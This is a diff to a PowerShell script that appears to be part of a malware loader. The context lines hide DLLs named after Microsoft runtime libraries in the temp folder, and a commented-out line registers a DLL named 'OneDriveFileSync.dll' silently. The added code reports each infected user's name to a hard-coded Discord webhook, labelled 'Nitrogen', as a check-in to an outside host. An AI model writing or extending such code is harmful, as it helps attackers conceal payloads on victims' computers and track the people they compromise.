@@ -24,4 +24,22 @@ attrib +s +h "$env:tmp\msvcp140.dll"
 attrib +s +h "$env:tmp\vcruntime140.dll"
 attrib +s +h "$env:tmp\vcruntime140_1.dll"
 
+sleep 2
+
+# Define the Discord webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1253055227247198260/bVxZXaVNTuB9SfGYqI_gnuZxNBrc5MoTxJdUpGvkC6Hh4-14j2LuBfGFoMVDoitZF1Gn"
+
+# Define the message payload
+$payload = @{
+    content = "**$env:username** has joined - Nitrogen"
+} | ConvertTo-Json
+
+# Send the POST request to the webhook URL
+try {
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
+    Write-Output "Message sent successfully."
+} catch {
+    Write-Output "Failed to send message. Error: $_"
+}
+
 #start powershell -windowstyle h -args 'sleep 10;REGSVR32 /s $env:tmp\OneDriveFileSync.dll'
